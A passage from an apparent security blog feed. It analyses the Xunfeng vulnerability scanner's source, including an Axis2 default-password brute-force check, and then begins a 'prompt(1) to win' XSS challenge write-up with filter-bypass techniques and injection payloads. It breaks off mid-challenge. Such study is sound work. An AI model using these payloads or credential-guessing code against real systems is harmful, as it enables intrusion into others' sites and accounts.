class="string">"http://%s:%d"</span> % (host, int(port))</span><br><span class="line">    error_i = <span class="number">0</span></span><br><span class="line">    flag_list = [<span class="string">'Administration Page&lt;/title&gt;'</span>, <span class="string">'System Components'</span>, <span class="string">'"axis2-admin/upload"'</span>,</span><br><span class="line">                 <span class="string">'include page="footer.inc"&gt;'</span>, <span class="string">'axis2-admin/logout'</span>]</span><br><span class="line">    user_list = [<span class="string">'axis'</span>, <span class="string">'admin'</span>, <span class="string">'root'</span>]</span><br><span class="line">    PASSWORD_DIC.append(<span class="string">'axis2'</span>)</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> user_list:</span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> PASSWORD_DIC:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                login_url = url + <span class="string">'/axis2/axis2-admin/login'</span></span><br><span class="line">                PostStr = <span class="string">'userName=%s&amp;password=%s&amp;submit=+Login+'</span> % (user, password)</span><br><span class="line">                request = urllib2.Request(login_url, PostStr)</span><br><span class="line">                res = urllib2.urlopen(request, timeout=timeout)</span><br><span class="line">                res_html = res.read()</span><br><span class="line">            <span class="keyword">except</span> urllib2.HTTPError, e:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span> urllib2.URLError, e:</span><br><span class="line">                error_i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> error_i &gt;= <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> flag <span class="keyword">in</span> flag_list:</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> res_html:</span><br><span class="line">                    info = <span class="string">u'存在弱口令，用户名：%s，密码：%s'</span> % (user, password)</span><br><span class="line">                    <span class="keyword">return</span> info</span><br></pre></td></tr></table></figure><p>它上面的<code>get_plugin_info</code>是用来获取插件信息的，但在漏洞检测进程里面是没用的</p><p>他的检测很有意思，会有错误统计，超过三次以上就直接返回了，这里如果检测到了就直接返回那个信息</p><h3 id="保存结果"><a href="#保存结果" class="headerlink" title="保存结果"></a>保存结果</h3><p>最后<code>save_request</code>函数保存结果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_request</span><span class="params">(self)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> self.result_info:</span><br><span class="line">    time_ = datetime.datetime.now()</span><br><span class="line">    self.log(str(self.task_netloc) + <span class="string">" "</span> + self.result_info)</span><br><span class="line">    v_count = na_result.find(</span><br><span class="line">      &#123;<span class="string">"ip"</span>: self.task_netloc[<span class="number">0</span>], <span class="string">"port"</span>: self.task_netloc[<span class="number">1</span>], <span class="string">"info"</span>: self.result_info&#125;).count()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> v_count:</span><br><span class="line">      na_plugin.update(&#123;<span class="string">"name"</span>: self.task_plugin&#125;,</span><br><span class="line">                       &#123;<span class="string">"$inc"</span>: &#123;<span class="string">'count'</span>: <span class="number">1</span>&#125;&#125;)</span><br><span class="line">      vulinfo = &#123;<span class="string">"vul_name"</span>: self.plugin_info[<span class="string">'name'</span>], <span class="string">"vul_level"</span>: self.plugin_info[<span class="string">'level'</span>],</span><br><span class="line">                 <span class="string">"vul_type"</span>: self.plugin_info[<span class="string">'type'</span>]&#125;</span><br><span class="line">      w_vul = &#123;<span class="string">"task_id"</span>: self.task_id, <span class="string">"ip"</span>: self.task_netloc[<span class="number">0</span>], <span class="string">"port"</span>: self.task_netloc[<span class="number">1</span>],</span><br><span class="line">               <span class="string">"vul_info"</span>: vulinfo, <span class="string">"info"</span>: self.result_info, <span class="string">"time"</span>: time_,</span><br><span class="line">               <span class="string">"task_date"</span>: TASK_DATE_DIC[str(self.task_id)]&#125;</span><br><span class="line">      na_result.insert(w_vul)</span><br><span class="line">      <span class="comment"># self.wx_send(w_vul)  # 自行定义漏洞提醒</span></span><br></pre></td></tr></table></figure><p>这里大概就是先看看漏洞扫描结果数据库里有没有这条记录</p><p>没有的话就把<code>Plugin</code>库里的这个插件的扫到的漏洞的<code>count + 1</code></p><p>使用<code>$inc</code>操作符将一个字段的值增加或者减少</p><blockquote><p><code>{ $inc: { &lt;field1&gt;: &lt;amount1&gt;, &lt;field2&gt;: &lt;amount2&gt;, ... } }</code></p></blockquote><p>然后就是把漏洞信息以及IP地址、端口啥的都插进<code>Result</code>数据库里</p><h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><p>接下来看<code>main</code>函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    init()</span><br><span class="line">    PASSWORD_DIC, THREAD_COUNT, TIMEOUT, WHITE_LIST = get_config()</span><br><span class="line">    thread.start_new_thread(monitor, ())</span><br><span class="line">    thread.start_new_thread(kp_check, ())</span><br><span class="line">    thread.start_new_thread(kp_update, ())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            task_id, task_plan, task_target, task_plugin = queue_get()</span><br><span class="line">            <span class="keyword">if</span> task_id == <span class="string">''</span>:</span><br><span class="line">                time.sleep(<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> PLUGIN_DB:</span><br><span class="line">                <span class="keyword">del</span> sys.modules[PLUGIN_DB.keys()[<span class="number">0</span>]]  <span class="comment"># 清理插件缓存</span></span><br><span class="line">                PLUGIN_DB.clear()</span><br><span class="line">            <span class="keyword">for</span> task_netloc <span class="keyword">in</span> task_target:</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    <span class="keyword">if</span> int(thread._count()) &lt; THREAD_COUNT:</span><br><span class="line">                        <span class="keyword">if</span> task_netloc[<span class="number">0</span>] <span class="keyword">in</span> WHITE_LIST:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            thread.start_new_thread(</span><br><span class="line">                                vulscan, (task_id, task_netloc, task_plugin))</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            <span class="keyword">print</span> e</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        time.sleep(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> task_plan == <span class="number">0</span>:</span><br><span class="line">                na_task.update(&#123;<span class="string">"_id"</span>: task_id&#125;, &#123;<span class="string">"$set"</span>: &#123;<span class="string">"status"</span>: <span class="number">2</span>&#125;&#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><p>这里先看看<code>init</code>函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    time_ = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">if</span> na_plugin.find().count() &gt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    install_kunpeng_plugin()</span><br></pre></td></tr></table></figure><p>这里如果插件数大于一个的话，就直接<code>return</code></p><h4 id="Plugin写入Mongo"><a href="#Plugin写入Mongo" class="headerlink" title="Plugin写入Mongo"></a>Plugin写入Mongo</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">script_plugin = []</span><br><span class="line">json_plugin = []</span><br><span class="line"><span class="keyword">print</span> <span class="string">'init plugins'</span></span><br><span class="line">file_list = os.listdir(sys.path[<span class="number">0</span>] + <span class="string">'/vuldb'</span>)</span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> file_list:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> filename.split(<span class="string">'.'</span>)[<span class="number">1</span>] == <span class="string">'py'</span>:</span><br><span class="line">      script_plugin.append(filename.split(<span class="string">'.'</span>)[<span class="number">0</span>])</span><br><span class="line">      <span class="keyword">if</span> filename.split(<span class="string">'.'</span>)[<span class="number">1</span>] == <span class="string">'json'</span>:</span><br><span class="line">        json_plugin.append(filename)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">          <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>然后就是把<code>vuldb</code>下的文件前缀给提取出来，然后存到两个相应的列表里</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> plugin_name <span class="keyword">in</span> script_plugin:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    res_tmp = __import__(plugin_name)</span><br><span class="line">    plugin_info = res_tmp.get_plugin_info()</span><br><span class="line">    plugin_info[<span class="string">'add_time'</span>] = time_</span><br><span class="line">    plugin_info[<span class="string">'filename'</span>] = plugin_name</span><br><span class="line">    plugin_info[<span class="string">'count'</span>] = <span class="number">0</span></span><br><span class="line">    na_plugin.insert(plugin_info)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>然后对于<code>py</code>的文件，动态加载，然后获得插件信息，插入时间、插件文件名还有个数<code>count</code>，最后把这个插入到<code>Plugin</code>中</p><p>同理对于<code>json</code>文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> plugin_name <span class="keyword">in</span> json_plugin:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    json_text = open(sys.path[<span class="number">0</span>] + <span class="string">'/vuldb/'</span> + plugin_name, <span class="string">'r'</span>).read()</span><br><span class="line">    plugin_info = json.loads(json_text)</span><br><span class="line">    plugin_info[<span class="string">'add_time'</span>] = time_</span><br><span class="line">    plugin_info[<span class="string">'filename'</span>] = plugin_name</span><br><span class="line">    plugin_info[<span class="string">'count'</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">del</span> plugin_info[<span class="string">'plugin'</span>]</span><br><span class="line">    na_plugin.insert(plugin_info)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>原理一致，都是读取<code>json</code>文件然后把信息写入<code>Plugin</code>，不过插入之前把<code>plugin</code>这个给删掉了</p><p>然后就是安装<code>kunpeng-plugin</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">install_kunpeng_plugin</span><span class="params">()</span>:</span></span><br><span class="line">    time_ = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">for</span> plugin <span class="keyword">in</span> kp.get_plugin_list():</span><br><span class="line">        level_list = [<span class="string">'紧急'</span>,<span class="string">'高危'</span>,<span class="string">'中危'</span>,<span class="string">'低危'</span>,<span class="string">'提示'</span>]</span><br><span class="line">        plugin_info = &#123;</span><br><span class="line">            <span class="string">'_id'</span>: plugin[<span class="string">'references'</span>][<span class="string">'kpid'</span>],</span><br><span class="line">            <span class="string">'name'</span>: <span class="string">'Kunpeng -'</span> + plugin[<span class="string">'name'</span>],</span><br><span class="line">            <span class="string">'info'</span>: plugin[<span class="string">'remarks'</span>] + <span class="string">' '</span> + plugin[<span class="string">'references'</span>][<span class="string">'cve'</span>],</span><br><span class="line">            <span class="string">'level'</span>: level_list[int(plugin[<span class="string">'level'</span>])],</span><br><span class="line">            <span class="string">'type'</span>: plugin[<span class="string">'type'</span>],</span><br><span class="line">            <span class="string">'author'</span>: plugin[<span class="string">'author'</span>],</span><br><span class="line">            <span class="string">'url'</span>: plugin[<span class="string">'references'</span>][<span class="string">'url'</span>],</span><br><span class="line">            <span class="string">'source'</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">'keyword'</span>: <span class="string">''</span>,</span><br><span class="line">            <span class="string">'add_time'</span>: time_,</span><br><span class="line">            <span class="string">'filename'</span>: plugin[<span class="string">'references'</span>][<span class="string">'kpid'</span>],</span><br><span class="line">            <span class="string">'count'</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        na_plugin.insert(plugin_info)</span><br></pre></td></tr></table></figure><p>获得这些信息后插入到<code>Plugin</code>当中</p><p>然后获取配置信息，包括<code>PASSWORD_DIC, THREAD_COUNT, TIMEOUT, WHITE_LIST</code></p><p>启动了三个线程</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">thread.start_new_thread(monitor, ())</span><br><span class="line">thread.start_new_thread(kp_check, ())</span><br><span class="line">thread.start_new_thread(kp_update, ())</span><br></pre></td></tr></table></figure><p>这里看看三个函数的作用</p><h4 id="心跳检测"><a href="#心跳检测" class="headerlink" title="心跳检测"></a>心跳检测</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">monitor</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> PASSWORD_DIC, THREAD_COUNT, TIMEOUT, WHITE_LIST</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        queue_count = na_task.find(&#123;<span class="string">"status"</span>: <span class="number">0</span>, <span class="string">"plan"</span>: <span class="number">0</span>&#125;).count()</span><br><span class="line">        <span class="keyword">if</span> queue_count:</span><br><span class="line">            load = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ac_count = thread._count()</span><br><span class="line">            load = float(ac_count - <span class="number">6</span>) / THREAD_COUNT</span><br><span class="line">        <span class="keyword">if</span> load &gt; <span class="number">1</span>:</span><br><span class="line">            load = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> load &lt; <span class="number">0</span>:</span><br><span class="line">            load = <span class="number">0</span></span><br><span class="line">        na_heart.update(&#123;<span class="string">"name"</span>: <span class="string">"load"</span>&#125;, &#123;</span><br><span class="line">                        <span class="string">"$set"</span>: &#123;<span class="string">"value"</span>: load, <span class="string">"up_time"</span>: datetime.datetime.now()&#125;&#125;)</span><br><span class="line">        PASSWORD_DIC, THREAD_COUNT, TIMEOUT, WHITE_LIST = get_config()</span><br><span class="line">        <span class="keyword">if</span> load &gt; <span class="number">0</span>:</span><br><span class="line">            time.sleep(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            time.sleep(<span class="number">60</span>)</span><br></pre></td></tr></table></figure><p>这里是心跳检测的，大概是如果判断有执行的任务的话，就设置<code>load</code>为1，否则就为0</p><p>然后对<code>Heart</code>进行更新，然后重新获取<code>PASSWORD_DIC, THREAD_COUNT, TIMEOUT, WHITE_LIST</code></p><p>如果有任务执行的话，就每隔8秒就检测一次心跳，否则的话就60秒检测一次心跳</p><h4 id="kunpeng新版本检测"><a href="#kunpeng新版本检测" class="headerlink" title="kunpeng新版本检测"></a>kunpeng新版本检测</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kp_check</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            new_release = kp.check_version()</span><br><span class="line">            <span class="keyword">print</span> new_release</span><br><span class="line">            <span class="keyword">if</span> new_release:</span><br><span class="line">                info = new_release[<span class="string">'body'</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'###'</span> <span class="keyword">in</span> new_release[<span class="string">'body'</span>]:</span><br><span class="line">                    info = new_release[<span class="string">'body'</span>].split(<span class="string">'###'</span>)[<span class="number">1</span>]</span><br><span class="line">                row = &#123;</span><br><span class="line">                    <span class="string">'info'</span>: info,</span><br><span class="line">                    <span class="string">'isInstall'</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'name'</span>: new_release[<span class="string">'name'</span>],</span><br><span class="line">                    <span class="string">'author'</span>: new_release[<span class="string">'author'</span>][<span class="string">'login'</span>],</span><br><span class="line">                    <span class="string">'pushtime'</span>: new_release[<span class="string">'published_at'</span>],</span><br><span class="line">                    <span class="string">'location'</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="string">'unicode'</span>: new_release[<span class="string">'tag_name'</span>],</span><br><span class="line">                    <span class="string">'coverage'</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'source'</span>: <span class="string">'kunpeng'</span></span><br><span class="line">                &#125;</span><br><span class="line">                na_update.insert(row)</span><br><span class="line">                time.sleep(<span class="number">60</span> * <span class="number">60</span> * <span class="number">48</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">        time.sleep(<span class="number">60</span> * <span class="number">30</span>)</span><br></pre></td></tr></table></figure><p><code>body</code>的值如下：</p><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">"body": "### 插件更新<span class="symbol">\r</span><span class="symbol">\n</span>增加 Atlassian Confluence Widget Connector macro RCE漏洞检测插件 CVE-2019-3396 @ywolf <span class="symbol">\r</span><span class="symbol">\n</span>增加 Microsoft Remote Desktop RCE漏洞检测插件  CVE-2019-0708 @Medicean <span class="symbol">\r</span><span class="symbol">\n</span><span class="symbol">\r</span><span class="symbol">\n</span>### 代码更新<span class="symbol">\r</span><span class="symbol">\n</span>修复 go并发调用时出现goroutine leak问题 @l3m0n <span class="symbol">\r</span><span class="symbol">\n</span>修复 加载json插件内存未释放问题 @l3m0n <span class="symbol">\r</span><span class="symbol">\n</span><span class="symbol">\r</span><span class="symbol">\n</span>### 其他<span class="symbol">\r</span><span class="symbol">\n</span>无"</span><br></pre></td></tr></table></figure><h4 id="kunpeng升级-依赖于前端触发"><a href="#kunpeng升级-依赖于前端触发" class="headerlink" title="kunpeng升级(依赖于前端触发)"></a>kunpeng升级(依赖于前端触发)</h4><p>然后对<code>kunpeng</code>的安装状态进行删除，重新写入<code>kunpeng</code>的插件信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kp_update</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            row = na_update.find_one_and_delete(</span><br><span class="line">                &#123;<span class="string">'source'</span>: <span class="string">'kunpeng'</span>, <span class="string">'isInstall'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">            <span class="keyword">if</span> row:</span><br><span class="line">                kp.update_version(row[<span class="string">'unicode'</span>])</span><br><span class="line">                na_plugin.delete_many(&#123;<span class="string">'_id'</span>:re.compile(<span class="string">'^KP'</span>)&#125;)</span><br><span class="line">                install_kunpeng_plugin()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>这一步需要配合<code>view.py</code>里面的对安装状态更改后，才能让<code>isInstall</code>变成1，这时候才能删除</p><h4 id="任务队列获取"><a href="#任务队列获取" class="headerlink" title="任务队列获取"></a>任务队列获取</h4><p>然后是获取任务队列信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queue_get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> TASK_DATE_DIC</span><br><span class="line">    task_req = na_task.find_and_modify(query=&#123;<span class="string">"status"</span>: <span class="number">0</span>, <span class="string">"plan"</span>: <span class="number">0</span>&#125;, update=&#123;</span><br><span class="line">                                       <span class="string">"$set"</span>: &#123;<span class="string">"status"</span>: <span class="number">1</span>&#125;&#125;, sort=&#123;<span class="string">'time'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> task_req:</span><br><span class="line">        TASK_DATE_DIC[str(task_req[<span class="string">'_id'</span>])] = datetime.datetime.now()</span><br><span class="line">        <span class="keyword">return</span> task_req[<span class="string">'_id'</span>], task_req[<span class="string">'plan'</span>], task_req[<span class="string">'target'</span>], task_req[<span class="string">'plugin'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        task_req_row = na_task.find(&#123;<span class="string">"plan"</span>: &#123;<span class="string">"$ne"</span>: <span class="number">0</span>&#125;&#125;)</span><br><span class="line">        <span class="keyword">if</span> task_req_row:</span><br><span class="line">            <span class="keyword">for</span> task_req <span class="keyword">in</span> task_req_row:</span><br><span class="line">                <span class="keyword">if</span> (datetime.datetime.now() - task_req[<span class="string">'time'</span>]).days / int(task_req[<span class="string">'plan'</span>]) &gt;= int(task_req[<span class="string">'status'</span>]):</span><br><span class="line">                    <span class="keyword">if</span> task_req[<span class="string">'isupdate'</span>] == <span class="number">1</span>:</span><br><span class="line">                        task_req[<span class="string">'target'</span>] = update_target(</span><br><span class="line">                            json.loads(task_req[<span class="string">'query'</span>]))</span><br><span class="line">                        na_task.update(&#123;<span class="string">"_id"</span>: task_req[<span class="string">'_id'</span>]&#125;, &#123;</span><br><span class="line">                                       <span class="string">"$set"</span>: &#123;<span class="string">"target"</span>: task_req[<span class="string">'target'</span>]&#125;&#125;)</span><br><span class="line">                    na_task.update(&#123;<span class="string">"_id"</span>: task_req[<span class="string">'_id'</span>]&#125;, &#123;</span><br><span class="line">                                   <span class="string">"$inc"</span>: &#123;<span class="string">"status"</span>: <span class="number">1</span>&#125;&#125;)</span><br><span class="line">                    TASK_DATE_DIC[str(task_req[<span class="string">'_id'</span>])</span><br><span class="line">                                  ] = datetime.datetime.now()</span><br><span class="line">                    <span class="keyword">return</span> task_req[<span class="string">'_id'</span>], task_req[<span class="string">'plan'</span>], task_req[<span class="string">'target'</span>], task_req[<span class="string">'plugin'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span></span><br></pre></td></tr></table></figure><p>大概逻辑是先查询是否有任务，有的话把状态<code>status</code>改成1，然后设置任务的时间为当前时间，返回查询到的编号、计划、目标以及使用的插件等等</p><p>要是没找到状态不是在计划当中的任务（<code>plan!=0</code>)</p><p>然后就会把查询到的写入到数据库当中（待补充）</p><h4 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">task_id, task_plan, task_target, task_plugin = queue_get()</span><br><span class="line">            <span class="keyword">if</span> task_id == <span class="string">''</span>:</span><br><span class="line">                time.sleep(<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> PLUGIN_DB:</span><br><span class="line">                <span class="keyword">del</span> sys.modules[PLUGIN_DB.keys()[<span class="number">0</span>]]  <span class="comment"># 清理插件缓存</span></span><br><span class="line">                PLUGIN_DB.clear()</span><br><span class="line">            <span class="keyword">for</span> task_netloc <span class="keyword">in</span> task_target:</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    <span class="keyword">if</span> int(thread._count()) &lt; THREAD_COUNT:</span><br><span class="line">                        <span class="keyword">if</span> task_netloc[<span class="number">0</span>] <span class="keyword">in</span> WHITE_LIST:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            thread.start_new_thread(</span><br><span class="line">                                vulscan, (task_id, task_netloc, task_plugin))</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            <span class="keyword">print</span> e</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        time.sleep(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> task_plan == <span class="number">0</span>:</span><br><span class="line">                na_task.update(&#123;<span class="string">"_id"</span>: task_id&#125;, &#123;<span class="string">"$set"</span>: &#123;<span class="string">"status"</span>: <span class="number">2</span>&#125;&#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><p>如果说这时候没有任务的话，就会<code>sleep(10)</code></p><p>然后下面两句删除了插件的缓存，因为<code>Vulscan</code>中一个插件是被多个目标调用，所以<code>PLUGIN_DB.keys()</code>是唯一的，然后清空<code>PLUGIN_DB</code>字典的值（为了加载最新的插件）</p><p>然后针对没一个目标<code>for</code>循环读取，当当前线程数小于设置的线程总数时候，才会添加线程，并且对于白名单的目标是不会添加线程的</p><p>然后对于每一个目标都实例化一个<code>vulscan</code>类，并启动新的线程进行扫描</p><p>下面的<code>if</code>判断用来设置扫描的优先级（这里得配合前端看看）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;巡风漏洞扫描系统漏洞扫描模块源码分析&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全研发" scheme="https://a2u13.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E5%8F%91/"/>
    
    
      <category term="巡风" scheme="https://a2u13.com/tags/%E5%B7%A1%E9%A3%8E/"/>
    
  </entry>
  
  <entry>
    <title>prompt挑战赛记录</title>
    <link href="https://a2u13.com/2020/03/21/prompt%E6%8C%91%E6%88%98%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
    <id>https://a2u13.com/2020/03/21/prompt%E6%8C%91%E6%88%98%E8%B5%9B%E8%AE%B0%E5%BD%95/</id>
    <published>2020-03-20T18:10:19.000Z</published>
    <updated>2020-06-07T06:28:28.931Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><p>prompt(1) to win 解题记录</p><a id="more"></a><h1 id="知识点速查"><a href="#知识点速查" class="headerlink" title="知识点速查"></a>知识点速查</h1><ol start="0"><li>直接闭合双引号和尖括号插入<code>img</code>标签</li><li>使用<code>img</code>标签配合<code>//</code>吞并后面的标签</li><li>使用<code>svg</code>标签来实现<code>xml</code>解析从而使得<code>&amp;#40;</code>可以被解析为<code>(</code></li><li>使用<code>!--&gt;</code>来让<code>HTML</code>解析器自动转为<code>--&gt;</code></li><li>使用<code>@</code>以前面网页的身份访问远程JS文件，并且这里需要对<code>/</code>编码%2f进行绕过</li><li>改变<code>input</code>的<code>type=image</code>以及<code>onerror=</code>换行绕过正则</li><li>通过<code>JavaScript</code>对<code>form</code>表单有重复键名时取后一个键的值来绕过</li><li>使用<code>/**/</code>注释以及定义的<code>#</code>进行换行</li><li>使用<code>\u2028或者\u2029</code>绕过对<code>\r\n</code>的正则过滤</li><li>使用不知道哪国的古英文<code>ſ</code>经过编码后变成<code>s</code>绕过</li><li>利用对<code>&#39;</code>以及<code>prompt</code>的过滤顺序实现过滤后拼接成paoload</li><li>使用<code>(prompt(1)) in &quot;1&quot;</code>返回<code>True</code>来实现弹窗</li><li>使用<code>eval</code>和<code>toString</code>来实现进制的转换</li><li>Javascript原型链污染绕过</li><li>利用过滤拼接<code>data:text/html;base64,xxxxx</code>绕过</li><li>利用<code>&lt;svg&gt;</code>以及<code>&lt;!--#--&gt;</code>实现解析为<code>xml</code>和注释绕过</li></ol><h1 id="第零关"><a href="#第零关" class="headerlink" title="第零关"></a>第零关</h1><p>没什么好说的，最基本的闭合双引号创造新的<code>img</code>标签触发弹窗</p><blockquote><p>Payload: <code>&quot;/&gt;&lt;img src=# onerror=prompt(1) &quot;</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321021357213.png" alt="image-20200321021357213"> </p><h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><p>这一关对输入进行了正则匹配</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以说输入不能用<code>&lt;&gt;</code>来闭合</p><p>这里给出payload</p><blockquote><p>Payload: <code>&lt;img src=# onerror=prompt(1)//</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321022249196.png" alt="image-20200321022249196"></p><p>但我不知道这里为什么加两个<code>/</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321022317553.png" alt="image-20200321022317553"></p><p>还有这样也是可以的，他在后面自动加了一个<code>&lt;article&gt;</code>标签来闭合？</p><p>真的很神奇</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321022547731.png" alt="image-20200321022547731"></p><h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><p>看一下过滤</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span 